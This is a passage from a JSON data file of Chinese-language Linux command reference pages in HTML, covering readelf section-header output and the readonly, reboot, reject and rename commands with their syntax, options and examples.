</span><span class=\"hljs-number\"> 4 </span>\n  [32] .debug_str        PROGBITS       <span class=\"hljs-number\"> 00000000 </span>007f4c<span class=\"hljs-number\"> 000735 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [33] .debug_loc        PROGBITS       <span class=\"hljs-number\"> 00000000 </span>008681 0000f3<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [34] .shstrtab         STRTAB         <span class=\"hljs-number\"> 00000000 </span>008774<span class=\"hljs-number\"> 000151 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [35] .symtab           SYMTAB         <span class=\"hljs-number\"> 00000000 </span>008e90<span class=\"hljs-number\"> 000590 </span>10    <span class=\"hljs-number\"> 36 </span><span class=\"hljs-number\"> 61 </span><span class=\"hljs-number\"> 4 </span>\n  [36] .strtab           STRTAB         <span class=\"hljs-number\"> 00000000 </span>009420 0003f4<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n</code></pre>\n<p>可见，相对非调试版本的可执行文件，多了\".debug*\"段的信息。&nbsp;</p>\n<p> <strong>查看一个目标文件的elf文件的节信息：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost test]$ readelf -S myfile.o \nThere are<span class=\"hljs-number\"> 15 </span>section headers, starting at offset 0x204: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL           <span class=\"hljs-number\"> 00000000 </span>000000<span class=\"hljs-number\"> 000000 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 0 </span>\n  [ 1] .text             PROGBITS       <span class=\"hljs-number\"> 00000000 </span>000034 00009e<span class=\"hljs-number\"> 00 </span> AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 2] .rel.text         REL            <span class=\"hljs-number\"> 00000000 </span>000744<span class=\"hljs-number\"> 000060 </span>08    <span class=\"hljs-number\"> 13 </span> <span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 4 </span>\n  [ 3] .data             PROGBITS       <span class=\"hljs-number\"> 00000000 </span>0000d4<span class=\"hljs-number\"> 000000 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 4] .bss              NOBITS         <span class=\"hljs-number\"> 00000000 </span>0000d4<span class=\"hljs-number\"> 000001 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 5] .ctors            PROGBITS       <span class=\"hljs-number\"> 00000000 </span>0000d4<span class=\"hljs-number\"> 000004 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 6] .rel.ctors        REL            <span class=\"hljs-number\"> 00000000 </span>0007a4<span class=\"hljs-number\"> 000008 </span>08    <span class=\"hljs-number\"> 13 </span> <span class=\"hljs-number\"> 5 </span><span class=\"hljs-number\"> 4 </span>\n  [ 7] .rodata           PROGBITS       <span class=\"hljs-number\"> 00000000 </span>0000d8<span class=\"hljs-number\"> 000006 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [ 8] .eh_frame         PROGBITS       <span class=\"hljs-number\"> 00000000 </span>0000e0 00008c<span class=\"hljs-number\"> 00 </span>  A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 9] .rel.eh_frame     REL            <span class=\"hljs-number\"> 00000000 </span>0007ac<span class=\"hljs-number\"> 000028 </span>08    <span class=\"hljs-number\"> 13 </span> <span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 4 </span>\n  [10] .comment          PROGBITS       <span class=\"hljs-number\"> 00000000 </span>00016c 00002e<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [11] .note.GNU-stack   PROGBITS       <span class=\"hljs-number\"> 00000000 </span>00019a<span class=\"hljs-number\"> 000000 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [12] .shstrtab         STRTAB         <span class=\"hljs-number\"> 00000000 </span>00019a 00006a<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [13] .symtab           SYMTAB         <span class=\"hljs-number\"> 00000000 </span>00045c<span class=\"hljs-number\"> 000180 </span>10    <span class=\"hljs-number\"> 14 </span><span class=\"hljs-number\"> 14 </span><span class=\"hljs-number\"> 4 </span>\n  [14] .strtab           STRTAB         <span class=\"hljs-number\"> 00000000 </span>0005dc<span class=\"hljs-number\"> 000166 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n\n\n```shell\n\n **查看一个静态库文件的elf文件的节信息：** \n\n```shell\n[root@localhost test]$ readelf -S libmy.a \nFile: libmy.a(myfile.o) \nThere are<span class=\"hljs-number\"> 15 </span>section headers, starting at offset 0x204: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL           <span class=\"hljs-number\"> 00000000 </span>000000<span class=\"hljs-number\"> 000000 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 0 </span>\n  [ 1] .text             PROGBITS       <span class=\"hljs-number\"> 00000000 </span>000034 00009e<span class=\"hljs-number\"> 00 </span> AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 2] .rel.text         REL            <span class=\"hljs-number\"> 00000000 </span>000744<span class=\"hljs-number\"> 000060 </span>08    <span class=\"hljs-number\"> 13 </span> <span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 4 </span>\n  [ 3] .data             PROGBITS       <span class=\"hljs-number\"> 00000000 </span>0000d4<span class=\"hljs-number\"> 000000 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 4] .bss              NOBITS         <span class=\"hljs-number\"> 00000000 </span>0000d4<span class=\"hljs-number\"> 000001 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 5] .ctors            PROGBITS       <span class=\"hljs-number\"> 00000000 </span>0000d4<span class=\"hljs-number\"> 000004 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 6] .rel.ctors        REL            <span class=\"hljs-number\"> 00000000 </span>0007a4<span class=\"hljs-number\"> 000008 </span>08    <span class=\"hljs-number\"> 13 </span> <span class=\"hljs-number\"> 5 </span><span class=\"hljs-number\"> 4 </span>\n  [ 7] .rodata           PROGBITS       <span class=\"hljs-number\"> 00000000 </span>0000d8<span class=\"hljs-number\"> 000006 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [ 8] .eh_frame         PROGBITS       <span class=\"hljs-number\"> 00000000 </span>0000e0 00008c<span class=\"hljs-number\"> 00 </span>  A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 9] .rel.eh_frame     REL            <span class=\"hljs-number\"> 00000000 </span>0007ac<span class=\"hljs-number\"> 000028 </span>08    <span class=\"hljs-number\"> 13 </span> <span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 4 </span>\n  [10] .comment          PROGBITS       <span class=\"hljs-number\"> 00000000 </span>00016c 00002e<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [11] .note.GNU-stack   PROGBITS       <span class=\"hljs-number\"> 00000000 </span>00019a<span class=\"hljs-number\"> 000000 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [12] .shstrtab         STRTAB         <span class=\"hljs-number\"> 00000000 </span>00019a 00006a<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [13] .symtab           SYMTAB         <span class=\"hljs-number\"> 00000000 </span>00045c<span class=\"hljs-number\"> 000180 </span>10    <span class=\"hljs-number\"> 14 </span><span class=\"hljs-number\"> 14 </span><span class=\"hljs-number\"> 4 </span>\n  [14] .strtab           STRTAB         <span class=\"hljs-number\"> 00000000 </span>0005dc<span class=\"hljs-number\"> 000166 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n</code></pre>\n<p> <strong>查看一个动态库文件的elf文件的节信息：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost test]$ readelf -S libmy.so \nThere are<span class=\"hljs-number\"> 27 </span>section headers, starting at offset 0xad0: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL           <span class=\"hljs-number\"> 00000000 </span>000000<span class=\"hljs-number\"> 000000 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 0 </span>\n  [ 1] .gnu.hash         GNU_HASH        000000d4 0000d4 00003c<span class=\"hljs-number\"> 04 </span>  A <span class=\"hljs-number\"> 2 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 2] .dynsym           DYNSYM         <span class=\"hljs-number\"> 00000110 </span>000110<span class=\"hljs-number\"> 000120 </span>10   A <span class=\"hljs-number\"> 3 </span> <span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 4 </span>\n  [ 3] .dynstr           STRTAB         <span class=\"hljs-number\"> 00000230 </span>000230<span class=\"hljs-number\"> 000199 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [ 4] .gnu.version      VERSYM          000003ca 0003ca<span class=\"hljs-number\"> 000024 </span>02   A <span class=\"hljs-number\"> 2 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 2 </span>\n  [ 5] .gnu.version_r    VERNEED         000003f0 0003f0<span class=\"hljs-number\"> 000050 </span>00   A <span class=\"hljs-number\"> 3 </span> <span class=\"hljs-number\"> 2 </span><span class=\"hljs-number\"> 4 </span>\n  [ 6] .rel.dyn          REL            <span class=\"hljs-number\"> 00000440 </span>000440 0000b0<span class=\"hljs-number\"> 08 </span>  A <span class=\"hljs-number\"> 2 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 7] .rel.plt          REL             000004f0 0004f0<span class=\"hljs-number\"> 000010 </span>08   A <span class=\"hljs-number\"> 2 </span> <span class=\"hljs-number\"> 9 </span><span class=\"hljs-number\"> 4 </span>\n  [ 8] .init             PROGBITS       <span class=\"hljs-number\"> 00000500 </span>000500<span class=\"hljs-number\"> 000017 </span>00  AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 9] .plt              PROGBITS       <span class=\"hljs-number\"> 00000518 </span>000518<span class=\"hljs-number\"> 000030 </span>04  AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [10] .text             PROGBITS       <span class=\"hljs-number\"> 00000550 </span>000550 0001c4<span class=\"hljs-number\"> 00 </span> AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>16 \n  [11] .fini             PROGBITS       <span class=\"hljs-number\"> 00000714 </span>000714 00001c<span class=\"hljs-number\"> 00 </span> AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [12] .rodata           PROGBITS       <span class=\"hljs-number\"> 00000730 </span>000730<span class=\"hljs-number\"> 000006 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [13] .eh_frame_hdr     PROGBITS       <span class=\"hljs-number\"> 00000738 </span>000738 00002c<span class=\"hljs-number\"> 00 </span>  A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [14] .eh_frame         PROGBITS       <span class=\"hljs-number\"> 00000764 </span>000764<span class=\"hljs-number\"> 000090 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [15] .ctors            PROGBITS        000017f4 0007f4 00000c<span class=\"hljs-number\"> 00 </span> WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [16] .dtors            PROGBITS       <span class=\"hljs-number\"> 00001800 </span>000800<span class=\"hljs-number\"> 000008 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [17] .jcr              PROGBITS       <span class=\"hljs-number\"> 00001808 </span>000808<span class=\"hljs-number\"> 000004 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [18] .data.rel.ro      PROGBITS        0000180c 00080c<span class=\"hljs-number\"> 000004 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [19] .dynamic          DYNAMIC        <span class=\"hljs-number\"> 00001810 </span>000810 0000e0<span class=\"hljs-number\"> 08 </span> WA <span class=\"hljs-number\"> 3 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [20] .got              PROGBITS        000018f0 0008f0 00000c<span class=\"hljs-number\"> 04 </span> WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [21] .got.plt          PROGBITS        000018fc 0008fc<span class=\"hljs-number\"> 000014 </span>04  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [22] .bss              NOBITS         <span class=\"hljs-number\"> 00001910 </span>000910 00000c<span class=\"hljs-number\"> 00 </span> WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [23] .comment          PROGBITS       <span class=\"hljs-number\"> 00000000 </span>000910 0000e6<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [24] .shstrtab         STRTAB         <span class=\"hljs-number\"> 00000000 </span>0009f6 0000da<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [25] .symtab           SYMTAB         <span class=\"hljs-number\"> 00000000 </span>000f08<span class=\"hljs-number\"> 000410 </span>10    <span class=\"hljs-number\"> 26 </span><span class=\"hljs-number\"> 48 </span><span class=\"hljs-number\"> 4 </span>\n  [26] .strtab           STRTAB         <span class=\"hljs-number\"> 00000000 </span>001318<span class=\"hljs-number\"> 000333 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "readonly",
        "des": "标记shell变量或函数为只读",
        "body": "<h1 id=\"readonly\">readonly</h1>\n<p>标记shell变量或函数为只读</p>\n<h2 id=\"语法\">语法</h2>\n<pre><code class=\"language-shell\">readonly <span class=\"hljs-selector-attr\">[-aAf]</span> <span class=\"hljs-selector-attr\">[name[=value]</span> ...]\nreadonly -<span class=\"hljs-selector-tag\">p</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>定义一到多个变量并设置只读属性。</li>\n<li>为已定义的一到多个变量设置只读属性。</li>\n<li>显示全部包含只读属性的变量。</li>\n<li>为已定义的一到多个函数设置只读属性。</li>\n<li>显示全部包含只读属性的函数。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：指向数组。</span>\n<span class=\"hljs-deletion\">-A：指向关联数组。</span>\n<span class=\"hljs-deletion\">-f：指向函数。</span>\n<span class=\"hljs-deletion\">-p：显示全部只读变量。</span>\n<span class=\"hljs-deletion\">--：在它之后的选项无效。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">name</span>（可选）：变量名或函数名\nvalue（可选）：变量的值\n</code></pre>\n<h3 id=\"返回值\">返回值</h3>\n<p>readonly返回true除非你提供了非法选项或非法名称。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 定义变量并增加只读属性</span>\n<span class=\"hljs-keyword\">readonly</span> var1=<span class=\"hljs-number\">13</span> var2\n<span class=\"hljs-keyword\">readonly</span> -a arr1=(<span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">5</span>) arr2=(<span class=\"hljs-string\">'z'</span> <span class=\"hljs-string\">'x'</span> <span class=\"hljs-string\">'c'</span>)\n<span class=\"hljs-meta\"># 必须有 '-A' 选项</span>\n<span class=\"hljs-keyword\">readonly</span> -A dict1=([<span class=\"hljs-string\">'key1'</span>]=<span class=\"hljs-string\">'value1'</span>)\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 先定义变量、函数，然后再为它们添加只读属性</span>\nmax=3\n<span class=\"hljs-built_in\">readonly</span> max\n\n<span class=\"hljs-comment\"># 数组定义时可以不加 `declare -a`</span>\nseasons=(<span class=\"hljs-string\">'spring'</span> <span class=\"hljs-string\">'summer'</span> <span class=\"hljs-string\">'autumn'</span> <span class=\"hljs-string\">'winter'</span>)\n<span class=\"hljs-comment\"># 为数组添加只读属性时可以不加 `-a` 选项</span>\n<span class=\"hljs-built_in\">readonly</span> seasons\n\n<span class=\"hljs-built_in\">declare</span> -A man=([<span class=\"hljs-string\">'age'</span>]=23 [<span class=\"hljs-string\">'height'</span>]=<span class=\"hljs-string\">'190cm'</span>)\n<span class=\"hljs-comment\"># 为关联数组添加只读属性时可以不加 `-A` 选项</span>\n<span class=\"hljs-built_in\">readonly</span> man\n\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">foo</span></span>(){ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'bar'</span>; }\n<span class=\"hljs-comment\"># 为函数添加只读属性时必须加 `-f` 选项</span>\n<span class=\"hljs-built_in\">readonly</span> -f foo\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 显示全部只读变量，以下两个命令的显示结果一样</span>\n<span class=\"hljs-keyword\">readonly</span>\n<span class=\"hljs-keyword\">readonly</span> -p\n<span class=\"hljs-meta\"># 显示全部拥有只读属性的数组</span>\n<span class=\"hljs-keyword\">readonly</span> -a\n<span class=\"hljs-meta\"># 显示全部拥有只读属性的关联数组</span>\n<span class=\"hljs-keyword\">readonly</span> -A\n<span class=\"hljs-meta\"># 显示全部拥有只读属性的函数</span>\n<span class=\"hljs-keyword\">readonly</span> -f\n</code></pre>\n<h2 id=\"常见错误\">常见错误</h2>\n<p>对于只读变量而言，若用户对其值进行修改，则会立即报错。例如，使用该指令定义一个只读变量\"test\"，并且将其值初始化为\"ok\"，输入如下命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># readonly test=<span class=\"hljs-string\">'ok'</span>        #定义只读变量并初始化 </span>\n</code></pre>\n<p>那么当用户直接修改该只读变量时就会报错，如下所示：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># test=<span class=\"hljs-string\">'my'</span>                 #试图修改只读变量的值</span>\n-bash: test: readonly variable\n</code></pre>\n<p>当用户试图修改只读变量的值时，会被提示该变量为只读变量。</p>\n<h2 id=\"注意\">注意</h2>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n<li><code>declare +r</code>不能去除只读属性， <code>unset</code>不能删除只读变量。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "reboot",
        "des": "重新启动正在运行的Linux操作系统",
        "body": "<h1 id=\"reboot\">reboot</h1>\n<p>重新启动正在运行的Linux操作系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>reboot命令</strong> 用来重新启动正在运行的Linux操作系统。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">reboot</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：重新开机时不把数据写入记录文件/var/tmp/wtmp。本参数具有“-n”参数效果；</span>\n<span class=\"hljs-deletion\">-f：强制重新开机，不调用shutdown指令的功能；</span>\n<span class=\"hljs-deletion\">-i：在重开机之前，先关闭所有网络界面；</span>\n<span class=\"hljs-deletion\">-n：重开机之前不检查是否有未结束的程序；</span>\n<span class=\"hljs-deletion\">-w：仅做测试，并不真正将系统重新开机，只会把重开机的数据写入/var/log目录下的wtmp记录文件。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">reboot        <span class=\"hljs-regexp\">//</span>重开机。\nreboot -w     <span class=\"hljs-regexp\">//</span>做个重开机的模拟（只有纪录并不会真的重开机）。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "reject",
        "des": "指示打印系统拒绝发往指定目标打印机的打印任务",
        "body": "<h1 id=\"reject\">reject</h1>\n<p>指示打印系统拒绝发往指定目标打印机的打印任务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>reject命令</strong> 属于CUPS套件，用于指示打印系统拒绝发往指定目标打印机的打印任务。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">reject</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-E：当连接到服务器时强制使用加密；</span>\n<span class=\"hljs-deletion\">-U：指定连接服务器时使用的用户名；</span>\n<span class=\"hljs-deletion\">-h：指定连接服务器名和端口号；</span>\n<span class=\"hljs-deletion\">-r：指定拒绝打印任务的原因。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目标：指定目标打印机。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rename",
        "des": "用字符串替换的方式批量改变文件名",
        "body": "<h1 id=\"rename\">rename</h1>\n<p>用字符串替换的方式批量改变文件名</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>rename命令存在两个版本用法上有所区别 </p>\n<pre><code class=\"language-bash\"><span class=\"hljs-symbol\">C</span>语言版本, 支持通配符\n[常用通配符说明]\n?    表示一个任意字符\n*    表示一个或一串任意字符\n\n<span class=\"hljs-symbol\">Perl</span>版本, 支持正则表达式\n[常用正则表达式符号说明]\n^    匹配输入的开始位置\n$    匹配输入的结尾\n.    匹配除换行符外的任意字符\n+    匹配前一个字符一次或多次 例如，<span class=\"hljs-string\">\"zo+\"</span>可以匹配<span class=\"hljs-string\">\"zoo\"</span>,但不匹配<span class=\"hljs-string\">\"z\"</span>\n[a-z]    表示某个范围内的字符，例如，<span class=\"hljs-string\">\"[a-z]\"</span>匹配<span class=\"hljs-string\">\"a\"</span>与<span class=\"hljs-string\">\"z\"</span>之间的任何一个小写字母字符。\n[^m-z]    否定的字符区间。与不在指定区间内的字符匹配。\n</code></pre>\n<p>区分方法: <code>rename --version</code></p>\n<p>如果返回结果中包含 <strong>util-linux</strong> , 说明是C语言版本, 反之是Perl版本</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-comment\"># Perl版本 | Ubuntu(18),Mint(20)默认的是Perl版本</span>\n$ <span class=\"hljs-built_in\">rename</span> <span class=\"hljs-comment\">--version</span>\n/usr/bin/<span class=\"hljs-built_in\">rename</span> <span class=\"hljs-keyword\">using</span> File::Rename <span class=\"hljs-built_in\">version</span> <span class=\"hljs-number\">1.10</span>\n\n<span class=\"hljs-comment\"># C语言版本 | Centos(7)默认的是C语言版本</span>\n$ <span class=\"hljs-built_in\">rename</span> <span class=\"hljs-comment\">--version</span>\n<span class=\"hljs-built_in\">rename</span>，来自 util-linux <span class=\"hljs-number\">2.23</span><span class=\"hljs-number\">.2</span>\n</code></pre>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-bash\"># <span class=\"hljs-symbol\">Perl</span>版本\nrename [ -h|-m|-<span class=\"hljs-symbol\">V</span> ] [ -v ] [ <span class=\"hljs-number\">-0</span> ] [ -n ] [ -f ] [ -d ] [ -e|-<span class=\"hljs-symbol\">E</span> perlexpr]*|perlexpr [ files ]\n\n# <span class=\"hljs-symbol\">C</span>语言版本\nrename [选项] 表达式 替换的字符 文件...\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-bash\"><span class=\"hljs-comment\"># Perl版本</span>\n-<span class=\"hljs-string\">v</span>, <span class=\"hljs-built_in\">--verbose</span>\n        详细：成功重命名的文件的打印名称。\n\n-<span class=\"hljs-string\">0</span>, <span class=\"hljs-built_in\">--null</span>\n        从<span class=\"hljs-string\">STDIN</span>读取时，请使用\\<span class=\"hljs-string\">0</span>作为记录分隔符\n\n-<span class=\"hljs-string\">n</span>, <span class=\"hljs-built_in\">--nono</span>\n        不执行任何操作：打印要重命名的文件名，但不重命名。\n\n-<span class=\"hljs-string\">f</span>, <span class=\"hljs-built_in\">--force</span>\n        覆盖：允许覆盖现有文件\n\n<span class=\"hljs-built_in\">--path,</span> <span class=\"hljs-built_in\">--fullpath</span>\n        重命名完整路径：包括任何目录组件。默认\n\n-<span class=\"hljs-string\">d</span>, <span class=\"hljs-built_in\">--filename,</span> <span class=\"hljs-built_in\">--nopath,</span> <span class=\"hljs-built_in\">--nofullpath</span>\n        不重命名目录：仅重命名路径的文件名部分\n\n-<span class=\"hljs-string\">h</span>, <span class=\"hljs-built_in\">--help</span>\n        帮助：打印提要和选项。\n\n-<span class=\"hljs-string\">m</span>, <span class=\"hljs-built_in\">--man</span>\n        手册: 打印手册页.\n\n-<span class=\"hljs-string\">V</span>, <span class=\"hljs-built_in\">--version</span>\n        版本: 显示版本号.\n\n-<span class=\"hljs-string\">e</span>      表达: 作用于文件名的代码.\n\n        可以重复来构建代码（比如“<span class=\"hljs-string\">perl-e</span>”）。如果没有-<span class=\"hljs-string\">e</span>，则第一个参数用作代码。\n\n-<span class=\"hljs-string\">E</span>      语句：对文件名执行操作的代码，如-<span class=\"hljs-string\">e</span>，但终止于 <span class=\"hljs-string\">';'</span>.\n\n\n<span class=\"hljs-comment\"># C语言版本</span>\n-<span class=\"hljs-string\">v</span>, <span class=\"hljs-built_in\">--verbose</span>\n        提供视觉反馈，其中重命名了哪些文件（如果有的话）\n\n-<span class=\"hljs-string\">V</span>, <span class=\"hljs-built_in\">--version</span>\n        显示版本信息并退出。\n\n-<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--symlink</span>\n        在符号链接目标上执行重命名\n\n-<span class=\"hljs-string\">h</span>, <span class=\"hljs-built_in\">--help</span>\n        